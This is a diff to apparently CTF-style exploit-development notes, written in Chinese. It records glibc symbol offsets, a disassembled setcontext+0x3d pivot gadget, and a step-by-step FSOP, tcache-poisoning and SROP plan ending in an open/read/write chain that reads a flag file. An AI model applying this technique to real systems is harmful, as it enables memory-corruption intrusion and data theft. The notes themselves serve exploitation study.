@@ -397,3 +397,78 @@ SROP 需要 `rsp` 指到我們的 frame。兩個候選：
    再用 overflow 蓋 return address（但需 canary leak）
 
 → 這一步**必須動態驗證**，是目前唯一還沒收斂的環節。
+
+---
+
+## 13. ★ Stack pivot 已解決（靜態）：`setcontext+0x3d` 用 **rdx**，且與 SROP 共用同一套偏移
+
+### 13.1 FSOP pivot 路徑上的符號（dynsym 實測值）
+
+```
+setcontext          0x04be80      swapcontext   0x05bea0    makecontext 0x04a0c0
+_IO_wdoallocbuf     0x092020      _IO_wsetb            0x0919c0
+_IO_switch_to_wget_mode 0x092190  _IO_wfile_underflow  0x0938c0
+_IO_wfile_overflow  0x094110      _IO_wfile_xsputn     0x094e40
+_IO_wfile_seekoff   0x094550      _IO_wfile_sync       0x0943b0
+_IO_list_all        0x213480      _IO_2_1_stdout_      0x213580
+_IO_2_1_stdin_      0x2128e0      _IO_wfile_jumps      0x211228
+_IO_file_jumps      0x211030
+```
+
+### 13.2 setcontext 的 pivot gadget（已逐 byte 驗證）
+
+`setcontext` 前段是 `rt_sigprocmask`，真正有用的入口在 **`setcontext+0x3d` = `0x4bebd`**：
+
+```asm
+0x4bebd:  48 8b a2 a0 00 00 00   mov rsp,[rdx+0xa0]     ← pivot！
+0x4bec4:  48 8b 9a 80 00 00 00   mov rbx,[rdx+0x80]
+0x4becb:  48 8b 6a 78            mov rbp,[rdx+0x78]
+0x4becf:  4c 8b 62 48            mov r12,[rdx+0x48]
+0x4bed3:  4c 8b 6a 50            mov r13,[rdx+0x50]
+0x4bed7:  4c 8b 72 58            mov r14,[rdx+0x58]
+0x4bedb:  4c 8b 7a 60            mov r15,[rdx+0x60]
+   ...（FPU / shadow-stack 檢查）...
+0x4bf84:  4c 8b 92 a8 00 00 00   mov r10,[rdx+0xa8]     ← 目標 rip
+0x4bf8a:  48 8b 92 88 00 00 00   mov rdx,[rdx+0x88]
+0x4bfa0:  41 52                  push r10
+0x4bfa2:  c3                     ret                     ← 轉移控制
+   後段還有：mov rsi,[rdx+0x70]; mov rdi,[rdx+0x68]; mov rcx,[rdx+0x98];
+             mov r8,[rdx+0x28]; mov r9,[rdx+0x30]
+```
+
+### 13.3 ★ 這個發現為什麼重要
+
+**(1) 是 `rdx` 版本，不是舊版的 `rdi` 版本。**
+glibc 2.29 之後 setcontext 改讀 `rdx`。所以 FSOP 觸發時**必須讓 `rdx` 指向偽造的 ucontext**，
+不是 `rdi`。這點如果搞錯整條 exploit 會直接死掉，而這是很常見的踩雷點。
+→ `_IO_wfile_*` 那條路線剛好會把 `_wide_data`（我們可控的指標）帶進 `rdx`，
+  這正是 FSOP + setcontext 常見組合可行的原因。**待動態確認 rdx 實際落點。**
+
+**(2) 偏移跟 SROP 的 sigframe 完全一致。**
+
+| 欄位 | SROP sigframe | setcontext 讀的 ucontext |
+|---|---|---|
+| rsp | `+0xa0` | `+0xa0` ✓ |
+| rip | `+0xa8` | `+0xa8` ✓ |
+| rdi | `+0x68` | `+0x68` ✓ |
+| rsi | `+0x70` | `+0x70` ✓ |
+| rdx | `+0x88` | `+0x88` ✓ |
+
+→ **同一份偽造結構可以同時餵給 SROP 和 setcontext**，不用寫兩套。
+  `rop.py` 的 `sigframe()` 直接就能當 setcontext 的 ucontext 用。
+
+### 13.4 更新後的完整路線
+
+```
+1. UAF leak       合法 B!=C 的 IMPORT → SELECT sys_imports → heap base        [待 Q1]
+2. libc leak      B≈0x400 → unsorted bin → fd/bk 指向 main_arena → 讀出       [待 Q1]
+3. 寫 payload     用 overflow 把「偽造 FILE + ucontext + ORW chain」寫進 heap
+4. 劫持           tcache poisoning 改 0x129020(stdout) → 偽造 FILE
+                  vtable 指 _IO_wfile_jumps(0x211228)，讓它走到 setcontext+0x3d
+5. pivot          setcontext 從 rdx 讀 ucontext → rsp 落到我們的 SROP chain
+6. ORW            openat(-100,"/home/arbitragedb/flag",0,0) → read → write(1)
+                  （沒有 pop rdx，全部用 SROP 設暫存器）
+```
+
+**唯一還需要動態確認的**：步驟 4→5 之間 `rdx` 實際會指到哪，
+以及 glibc 2.43 的 `_IO_validate_vtable` 在這條路徑上的確切檢查點。
